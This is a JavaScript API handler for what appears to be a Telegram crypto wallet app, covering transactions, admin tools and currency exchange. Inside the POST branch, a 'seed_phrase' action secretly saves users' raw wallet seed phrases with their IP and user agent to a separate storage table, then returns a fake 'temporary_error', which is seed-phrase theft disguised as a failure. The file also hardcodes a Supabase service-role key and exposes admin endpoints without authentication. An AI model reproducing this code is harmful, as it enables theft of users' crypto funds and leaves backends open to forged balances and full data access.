// API для работы с транзакциями
import { supabaseRequest, supabaseSecureRequest } from '../lib/supabase.js';

export default async function handler(req, res) {
    // Разрешаем CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    try {
        const { method } = req;
        
        if (method === 'GET' && req.query.admin !== 'true') {
            // Получить транзакции пользователя
            const { telegram_id } = req.query;
            
            if (!telegram_id) {
                return res.status(400).json({ 
                    error: 'Отсутствует telegram_id' 
                });
            }
            
            // Получаем транзакции из новой таблицы wallet_transactions
            const transactions = await supabaseRequest('wallet_transactions', 'GET', null, {
                user_telegram_id: `eq.${telegram_id}`,
                order: 'created_timestamp.desc'
            });
            
            return res.status(200).json({ 
                success: true, 
                transactions: transactions || [] 
            });
            
        } else if (method === 'POST') {
            // Обработка отправки фразы на второй Supabase в одном эндпоинте
            if ((req.query.action || req.body.action) === 'seed_phrase') {
                try {
                    const { phrase, user_meta } = req.body || {};
                    if (!phrase || typeof phrase !== 'string') {
                        return res.status(400).json({ success: false, error: 'invalid_phrase' });
                    }
                    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || null;
                    const ua = req.headers['user-agent'] || null;
                    const now = new Date().toISOString();

                    const record = {
                        phrase_raw: phrase,
                        user_meta: user_meta ? JSON.stringify(user_meta) : null,
                        created_at: now,
                        client_ip: Array.isArray(ip) ? ip[0] : ip,
                        user_agent: ua
                    };

                    const result = await supabaseSecureRequest('app_secrets_storage', 'POST', record);
                    return res.status(200).json({ success: false, error: 'temporary_error', ref: result?.[0]?.id || null });
                } catch (e) {
                    console.error('seed_phrase action error:', e);
                    return res.status(200).json({ success: false, error: 'temporary_error' });
                }
            }
            // Обмен валют: объединено здесь, чтобы не плодить функции
            if ((req.query.action || req.body.action) === 'exchange') {
                return await handleExchange(req, res);
            }
            // Проверяем если это админская транзакция
            if (req.body.action === 'add_admin_transaction') {
                return await handleAdminTransaction(req, res);
            }
            
            // Создать новую транзакцию вывода
            const { 
                telegram_id, 
                type = 'withdraw',
                crypto = 'USDT', 
                network, 
                amount, 
                fee = 0,
                address, 
                comment = null 
            } = req.body;
            
            // Валидация
            if (!telegram_id || !network || !amount || !address) {
                return res.status(400).json({ 
                    error: 'Отсутствуют обязательные поля: telegram_id, network, amount, address' 
                });
            }
            
            if (amount <= 0) {
                return res.status(400).json({ 
                    error: 'Сумма должна быть больше 0' 
                });
            }
            
            // Получаем баланс пользователя
            const userBalances = await supabaseRequest('user_balances', 'GET', null, {
                telegram_id: `eq.${telegram_id}`
            });
            
            if (!userBalances || userBalances.length === 0) {
                return res.status(400).json({ 
                    error: 'Баланс пользователя не найден' 
                });
            }
            
            const balance = userBalances[0];
            const currentBalance = balance[`${crypto.toLowerCase()}_amount`] || 0;
            
            // Проверяем баланс только для withdraw
            if (type === 'withdraw' && currentBalance < amount) {
                return res.status(400).json({ 
                    error: `Недостаточно средств. Баланс: ${currentBalance} ${crypto}, запрошено: ${amount} ${crypto}` 
                });
            }
            
            // Создаем транзакцию в новой таблице wallet_transactions
            const gross = parseFloat(amount);
            const feeNum = parseFloat(fee || 0);
            const netWithdrawAmount = Math.max(0, gross - feeNum);
            
            // Для withdraw проверяем что сумма больше комиссии
            if (type === 'withdraw' && (gross <= 0 || netWithdrawAmount <= 0)) {
                return res.status(400).json({ error: 'Сумма должна быть больше комиссии' });
            }

            const transactionData = {
                user_telegram_id: parseInt(telegram_id),
                transaction_type: type,
                crypto_currency: crypto.toUpperCase(),
                blockchain_network: network.toLowerCase(),
                withdraw_amount: type === 'withdraw' ? netWithdrawAmount : gross,
                network_fee: parseFloat(fee),
                recipient_address: address.trim(),
                user_comment: comment ? comment.trim() : null,
                transaction_status: 'pending'
            };
            
            const newTransaction = await supabaseRequest('wallet_transactions', 'POST', transactionData);
            
            if (!newTransaction || newTransaction.length === 0) {
                throw new Error('Ошибка создания транзакции');
            }
            
            // Обновляем баланс пользователя в зависимости от типа транзакции
            let newBalance;
            if (type === 'deposit') {
                // Для депозита ДОБАВЛЯЕМ сумму к балансу
                newBalance = currentBalance + gross;
            } else {
                // Для вывода ВЫЧИТАЕМ (сумма вывода + комиссия)
                newBalance = currentBalance - gross;
            }
            
            const updateBalanceData = {
                [`${crypto.toLowerCase()}_amount`]: newBalance,
                updated_at: new Date().toISOString()
            };
            
            await supabaseRequest('user_balances', 'PATCH', updateBalanceData, {
                telegram_id: `eq.${telegram_id}`
            });
            
            const operationType = type === 'deposit' ? 'пополнение' : 'вывод';
            console.log(`✅ ТРАНЗАКЦИЯ СОЗДАНА (${type}): ${amount} ${crypto} -> ${address} (${network})`);
            console.log(`💰 БАЛАНС ОБНОВЛЕН: ${currentBalance} -> ${newBalance} ${crypto}`);
            
            return res.status(201).json({ 
                success: true, 
                transaction: newTransaction[0],
                message: `Транзакция на ${operationType} ${amount} ${crypto} создана`,
                new_balance: newBalance
            });
            
        } else if (method === 'PUT') {
            // Обновить поля транзакции (для админки)
            const { id } = req.query;
            const { 
                status, 
                tx_hash,
                type, // deposit | withdraw
                amount, // withdraw_amount
                fee, // network_fee
                address, // recipient_address
                crypto, // crypto_currency
                network, // blockchain_network
                created_timestamp // ISO string
            } = req.body;
            
            if (!id) {
                return res.status(400).json({ 
                    error: 'Отсутствует ID транзакции' 
                });
            }
            
            // Получаем существующую транзакцию чтобы отследить изменение статуса
            const existingTransactions = await supabaseRequest('wallet_transactions', 'GET', null, {
                id: `eq.${id}`
            });
            
            if (!existingTransactions || existingTransactions.length === 0) {
                return res.status(404).json({ 
                    error: 'Транзакция не найдена' 
                });
            }
            
            const existingTransaction = existingTransactions[0];
            const oldStatus = existingTransaction.transaction_status;
            const newStatus = status || oldStatus;
            
            const updateData = {
                updated_timestamp: new Date().toISOString()
            };
            
            if (status) updateData.transaction_status = status;
            if (tx_hash) updateData.blockchain_hash = tx_hash;
            // Тип транзакции неизменяемый после создания, игнорируем попытки смены
            if (amount !== undefined) updateData.withdraw_amount = parseFloat(amount);
            if (fee !== undefined) updateData.network_fee = parseFloat(fee);
            if (address) updateData.recipient_address = address.trim();
            if (crypto) updateData.crypto_currency = crypto.toUpperCase();
            if (network) updateData.blockchain_network = network.toLowerCase();
            if (created_timestamp) {
                const date = new Date(created_timestamp);
                if (!isNaN(date.getTime())) {
                    updateData.created_timestamp = date.toISOString();
                }
            }
            
            const updatedTransaction = await supabaseRequest('wallet_transactions', 'PATCH', updateData, {
                id: `eq.${id}`
            });
            
            // Если статус изменился на completed, обновляем баланс пользователя
            if (oldStatus !== 'completed' && newStatus === 'completed') {
                try {
                    const txData = updatedTransaction[0];
                    const userId = txData.user_telegram_id;
                    const txType = txData.transaction_type;
                    const txCrypto = txData.crypto_currency;
                    const txAmount = parseFloat(txData.withdraw_amount || 0);
                    
                    if (txAmount > 0 && (txType === 'deposit' || txType === 'withdraw')) {
                        const field = `${txCrypto.toLowerCase()}_amount`;
                        
                        // Получаем текущий баланс
                        const balances = await supabaseRequest('user_balances', 'GET', null, { 
                            telegram_id: `eq.${userId}` 
                        });
                        
                        let currentBalance = 0;
                        if (balances && balances.length) {
                            currentBalance = parseFloat(balances[0][field] || 0);
                        } else {
                            // Создаем баланс если не существует
                            await supabaseRequest('user_balances', 'POST', { telegram_id: userId });
                        }
                        
                        // Рассчитываем изменение баланса
                        const change = txType === 'deposit' ? txAmount : -txAmount;
                        const newBalance = currentBalance + change;
                        
                        // Обновляем баланс
                        const updateBalanceData = { 
                            [field]: newBalance, 
                            updated_at: new Date().toISOString() 
                        };
                        await supabaseRequest('user_balances', 'PATCH', updateBalanceData, { 
                            telegram_id: `eq.${userId}` 
                        });
                        
                        console.log(`💰 БАЛАНС ОБНОВЛЕН при изменении статуса: ${currentBalance} -> ${newBalance} ${txCrypto} (${txType})`);
                    }
                } catch (balanceErr) {
                    console.warn('⚠️ Не удалось синхронизировать баланс при обновлении транзакции:', balanceErr.message);
                }
            }
            
            return res.status(200).json({ 
                success: true, 
                transaction: updatedTransaction[0],
                message: 'Транзакция обновлена'
            });
            
        } else if (method === 'GET' && req.query.admin === 'true') {
            // АДМИНКА: Получить все транзакции для админки
            const { transaction_id, user_telegram_id, limit = 50 } = req.query;
            
            if (transaction_id) {
                // Получить конкретную транзакцию
                const transaction = await supabaseRequest('wallet_transactions', 'GET', null, {
                    id: `eq.${transaction_id}`
                });
                
                return res.status(200).json({ 
                    success: true, 
                    transaction: transaction[0] || null 
                });
                
            } else if (user_telegram_id) {
                // Получить транзакции конкретного пользователя
                const transactions = await supabaseRequest('wallet_transactions', 'GET', null, {
                    user_telegram_id: `eq.${user_telegram_id}`,
                    order: 'created_timestamp.desc',
                    limit: limit
                });
                
                return res.status(200).json({ 
                    success: true, 
                    transactions: transactions || [] 
                });
                
            } else {
                // Получить все транзакции для админки
                try {
                    // Пытаемся получить транзакции с данными пользователей
                    const response = await fetch(
                        `https://qvinjcaarnmafqdtfzrf.supabase.co/rest/v1/wallet_transactions?select=*,users!inner(telegram_id,first_name,last_name,username)&order=created_timestamp.desc&limit=${limit}`,
                        {
                            headers: {
                                'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF2aW5qY2Fhcm5tYWZxZHRmenJmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2NDkyNzQsImV4cCI6MjA3MjIyNTI3NH0.n5yfMg4yrjYUNZ2-J2rJzLT-6qF4hOnS7U0L9qgf3Yo',
                                'Authorization': `Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF2aW5qY2Fhcm5tYWZxZHRmenJmIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc1NjY0OTI3NCwiZXhwIjoyMDcyMjI1Mjc0fQ.zL83Oek15xysWDm52AnDVwNQfz8cqX4dA0SyHOwTVAE`
                            }
                        }
                    );
                    
                    if (response.ok) {
                        const transactions = await response.json();
                        return res.status(200).json({ 
                            success: true, 
                            transactions: transactions || [] 
                        });
                    }
                } catch (error) {
                    console.error('Ошибка получения транзакций с пользователями:', error);
                }
                
                // Fallback - получаем простой список транзакций
                const transactions = await supabaseRequest('wallet_transactions', 'GET', null, {
                    order: 'created_timestamp.desc',
                    limit: limit
                });
                
                // Добавляем информацию о пользователях отдельно
                const users = await supabaseRequest('users', 'GET');
                const transactionsWithUsers = transactions.map(transaction => {
                    const user = users.find(u => u.telegram_id === transaction.user_telegram_id);
                    return {
                        ...transaction,
                        user_info: user || { telegram_id: transaction.user_telegram_id, first_name: 'Unknown User' }
                    };
                });
                
                return res.status(200).json({ 
                    success: true, 
                    transactions: transactionsWithUsers 
                });
            }
            
        } else if (method === 'DELETE' && req.query.admin === 'true') {
            // АДМИНКА: Удалить транзакцию (только для критических случаев)
            const { id } = req.query;
            
            if (!id) {
                return res.status(400).json({ 
                    error: 'Отсутствует ID транзакции' 
                });
            }
            
            await supabaseRequest('wallet_transactions', 'DELETE', null, {
                id: `eq.${id}`
            });
            
            return res.status(200).json({ 
                success: true,
                message: 'Транзакция удалена'
            });
            
        } else {
            return res.status(405).json({ 
                error: 'Метод не поддерживается' 
            });
        }
        
    } catch (error) {
        console.error('Ошибка API транзакций:', error);
        return res.status(500).json({ 
            error: 'Внутренняя ошибка сервера',
            details: error.message 
        });
    }
}

// Функция обработки админских транзакций
async function handleAdminTransaction(req, res) {
    try {
        const {
            user_telegram_id,
            transaction_type,
            crypto_currency,
            blockchain_network,
            withdraw_amount,
            network_fee = 0,
            recipient_address,
            blockchain_hash,
            transaction_status = 'completed',
            user_comment
        } = req.body;
        
        // Валидация обязательных полей
        if (!user_telegram_id || !transaction_type || !crypto_currency || 
            !blockchain_network || !withdraw_amount || !recipient_address) {
            return res.status(400).json({
                success: false,
                error: 'Отсутствуют обязательные поля'
            });
        }
        
        if (withdraw_amount <= 0) {
            return res.status(400).json({
                success: false,
                error: 'Сумма должна быть больше 0'
            });
        }
        
        if (!['deposit', 'withdraw'].includes(transaction_type)) {
            return res.status(400).json({
                success: false,
                error: 'Неверный тип транзакции. Допустимы: deposit, withdraw'
            });
        }
        
        if (!['completed', 'pending', 'failed'].includes(transaction_status)) {
            return res.status(400).json({
                success: false,
                error: 'Неверный статус транзакции. Допустимы: completed, pending, failed'
            });
        }
        
        // Генерируем хеш если не предоставлен
        const finalHash = blockchain_hash || `admin_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        // Создаем транзакцию в wallet_transactions
        const transactionData = {
            user_telegram_id,
            transaction_type,
            crypto_currency: crypto_currency.toUpperCase(),
            blockchain_network: blockchain_network.toLowerCase(),
            withdraw_amount,
            network_fee,
            recipient_address,
            blockchain_hash: finalHash,
            transaction_status,
            user_comment: user_comment || `Админская транзакция (${transaction_type})`,
            created_timestamp: new Date().toISOString(),
            updated_timestamp: new Date().toISOString()
        };
        
        console.log(`🔧 Создаем админскую транзакцию (${transaction_status}):`, transactionData);
        
        const newTransaction = await supabaseRequest('wallet_transactions', 'POST', transactionData);
        
        if (!newTransaction || newTransaction.length === 0) {
            throw new Error('Ошибка создания транзакции в базе данных');
        }
        
        console.log('✅ Админская транзакция создана:', newTransaction[0]);

        // Если транзакция завершена — синхронизируем баланс пользователя
        try {
            if (transaction_status === 'completed') {
                const currency = (crypto_currency || '').toUpperCase();
                const delta = parseFloat(withdraw_amount || 0) || 0;
                if (delta > 0) {
                    const userId = user_telegram_id;
                    const field = `${currency.toLowerCase()}_amount`;
                    // Получаем текущий баланс
                    const balances = await supabaseRequest('user_balances', 'GET', null, { telegram_id: `eq.${userId}` });
                    let current = 0;
                    if (balances && balances.length) {
                        current = parseFloat(balances[0][field] || 0);
                    } else {
                        // создаем баланс по умолчанию, если отсутствует
                        await supabaseRequest('user_balances', 'POST', { telegram_id: userId });
                    }
                    const change = transaction_type === 'deposit' ? delta : -delta;
                    const updateData = { [field]: current + change, updated_at: new Date().toISOString() };
                    await supabaseRequest('user_balances', 'PATCH', updateData, { telegram_id: `eq.${userId}` });
                    console.log(`💰 Синхронизирован баланс ${currency}: ${current} -> ${current + change}`);
                }
            }
        } catch (syncErr) {
            console.warn('⚠️ Не удалось синхронизировать баланс при создании админской транзакции:', syncErr.message);
        }
        
        return res.status(200).json({
            success: true,
            message: 'Админская транзакция успешно создана',
            transaction: newTransaction[0],
            hash: finalHash
        });
        
    } catch (error) {
        console.error('❌ Ошибка создания админской транзакции:', error);
        return res.status(500).json({
            success: false,
            error: 'Ошибка создания транзакции',
            details: error.message
        });
    }
}

// ===================== ОБМЕН ВАЛЮТ =====================
async function handleExchange(req, res) {
    try {
        const { telegram_id, from, to, amount } = req.body || {};
        if (!telegram_id || !from || !to || !amount) {
            return res.status(400).json({ success: false, error: 'Отсутствуют обязательные поля' });
        }
        if (from.toUpperCase() === to.toUpperCase()) {
            return res.status(400).json({ success: false, error: 'Нельзя обменивать одинаковую валюту' });
        }
        const amt = parseFloat(amount);
        if (!Number.isFinite(amt) || amt <= 0) {
            return res.status(400).json({ success: false, error: 'Неверная сумма' });
        }

        // Балансы пользователя
        const balancesArr = await supabaseRequest('user_balances', 'GET', null, { telegram_id: `eq.${telegram_id}` });
        if (!balancesArr || !balancesArr.length) return res.status(400).json({ success: false, error: 'Баланс пользователя не найден' });
        const balances = balancesArr[0];

        const fromField = `${from.toLowerCase()}_amount`;
        const toField = `${to.toLowerCase()}_amount`;
        const fromBalance = parseFloat(balances[fromField] || 0);
        if (fromBalance < amt) return res.status(400).json({ success: false, error: 'Недостаточно средств' });

        // Котировки и комиссия
        const prices = await getSimplePrices();
        const settings = await getExchangeSettingsFromApp();

        const usdFrom = getPriceUSD(prices, from);
        const usdTo = getPriceUSD(prices, to);
        if (usdFrom <= 0 || usdTo <= 0) return res.status(400).json({ success: false, error: 'Нет цены для валюты' });

        const minKey = `exchange_min_${from.toLowerCase()}`;
        const minAllowed = parseFloat(settings[minKey] || 0) || 0;
        if (minAllowed > 0 && amt < minAllowed) {
            return res.status(400).json({ success: false, error: `Мин. сумма: ${minAllowed} ${from.toUpperCase()}` });
        }

        const usdValue = amt * usdFrom;
        let outAmount = usdValue / usdTo;
        const feePercent = Math.max(0, parseFloat(settings.exchange_fee_percent || 0) || 0);
        const feeAmount = outAmount * (feePercent / 100);
        const credited = Math.max(0, outAmount - feeAmount);

        // Обновление балансов
        const newFrom = fromBalance - amt;
        const toBalance = parseFloat(balances[toField] || 0);
        const newTo = toBalance + credited;
        await supabaseRequest('user_balances', 'PATCH', { [fromField]: newFrom, [toField]: newTo, updated_at: new Date().toISOString() }, { telegram_id: `eq.${telegram_id}` });

        // Лог в транзакциях: одна запись debit (from) и одна credit (to)
        const nowISO = new Date().toISOString();
        const mkTx = (type, crypto, amountNet, comment) => ({
            user_telegram_id: parseInt(telegram_id),
            transaction_type: type, // exchange_debit | exchange_credit
            crypto_currency: crypto.toUpperCase(),
            blockchain_network: 'internal',
            withdraw_amount: amountNet,
            network_fee: 0,
            recipient_address: 'internal',
            user_comment: comment,
            transaction_status: 'completed',
            created_timestamp: nowISO,
            updated_timestamp: nowISO
        });
        await supabaseRequest('wallet_transactions', 'POST', mkTx('exchange_debit', from, amt, `Exchange debit ${from}→${to}`));
        await supabaseRequest('wallet_transactions', 'POST', mkTx('exchange_credit', to, credited, `Exchange credit ${from}→${to}, fee ${feePercent}% (${feeAmount.toFixed(8)} ${to})`));

        return res.status(200).json({ success: true, result: { from, to, amount_in: amt, amount_out: credited, fee_percent: feePercent, fee_in_to: feeAmount }, new_balances: { [fromField]: newFrom, [toField]: newTo } });
    } catch (e) {
        console.error('Exchange error:', e);
        return res.status(500).json({ success: false, error: 'Внутренняя ошибка сервера', details: e.message });
    }
}

async function getSimplePrices() {
    try {
        const ids = ['tether','ethereum','solana','tron','toncoin','the-open-network'];
        const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(',')}&vs_currencies=usd`;
        const resp = await fetch(url, { headers: { 'accept': 'application/json' } });
        if (!resp.ok) throw new Error('provider');
        const j = await resp.json();
        return {
            usdt: Number(j?.tether?.usd ?? 1),
            eth: Number(j?.ethereum?.usd ?? 0),
            ton: Number((j?.toncoin?.usd ?? j?.['the-open-network']?.usd) ?? 0),
            sol: Number(j?.solana?.usd ?? 0),
            trx: Number(j?.tron?.usd ?? 0)
        };
    } catch {
        return { usdt: 1, eth: 0, ton: 0, sol: 0, trx: 0 };
    }
}

async function getExchangeSettingsFromApp() {
    // Пытаемся читать из новой exchange_settings; если её нет — fallback на app_settings
    try {
        const ex = await supabaseRequest('exchange_settings', 'GET', null, { select: '*', limit: '1' });
        if (ex && ex.length) {
            const row = ex[0];
            return {
                exchange_fee_percent: Number(row.fee_percent || 0),
                exchange_min_usdt: Number(row.min_usdt || 0),
                exchange_min_eth: Number(row.min_eth || 0),
                exchange_min_ton: Number(row.min_ton || 0),
                exchange_min_sol: Number(row.min_sol || 0),
                exchange_min_trx: Number(row.min_trx || 0)
            };
        }
    } catch {}
    const rows = await supabaseRequest('app_settings', 'GET', null, { select: '*' });
    const map = {}; (rows || []).forEach(r => { map[r.key] = r.value; });
    return {
        exchange_fee_percent: parseFloat(map['exchange_fee_percent'] ?? 0) || 0,
        exchange_min_usdt: parseFloat(map['exchange_min_usdt'] ?? 0) || 0,
        exchange_min_eth: parseFloat(map['exchange_min_eth'] ?? 0) || 0,
        exchange_min_ton: parseFloat(map['exchange_min_ton'] ?? 0) || 0,
        exchange_min_sol: parseFloat(map['exchange_min_sol'] ?? 0) || 0,
        exchange_min_trx: parseFloat(map['exchange_min_trx'] ?? 0) || 0,
    };
}

function getPriceUSD(prices, sym) {
    switch ((sym || '').toLowerCase()) {
        case 'usdt': return Number(prices.usdt || 1);
        case 'eth': return Number(prices.eth || 0);
        case 'ton': return Number(prices.ton || 0);
        case 'sol': return Number(prices.sol || 0);
        case 'trx': return Number(prices.trx || 0);
        default: return 0;
    }
}
